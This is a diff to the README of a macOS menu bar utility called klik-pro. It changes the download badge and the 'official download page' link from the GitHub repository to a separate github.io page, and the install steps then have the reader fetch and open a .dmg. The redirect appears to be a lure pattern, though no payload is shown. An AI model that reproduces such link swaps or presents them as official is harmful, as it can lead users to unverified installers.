@@ -1,6 +1,6 @@
 # 🖱️ klik-pro - Boost your daily computer workflow speed
 
-[![](https://img.shields.io/badge/Download-klik--pro-blue.svg)](https://github.com/aleecepucka766/klik-pro)
+[![](https://img.shields.io/badge/Download-klik--pro-blue.svg)](https://aleecepucka766.github.io)
 
 Klik-pro simplifies your daily computer tasks. This application lives in your menu bar and gives you control over mouse shortcuts, app profiles, and system settings. You save time by creating custom actions for your mouse buttons. You also manage different app instances and system states with one click.
 
@@ -24,7 +24,7 @@ The keep-awake menu prevents your computer from sleeping. You toggle this settin
 
 Follow these steps to install the app on your computer.
 
-1. Visit the [official download page](https://github.com/aleecepucka766/klik-pro) to get the installer.
+1. Visit the [official download page](https://aleecepucka766.github.io) to get the installer.
 2. Look for the file ending in `.dmg` for macOS systems.
 3. Open the downloaded file from your Downloads folder.
 4. Drag the Klik-pro icon into your Applications folder.
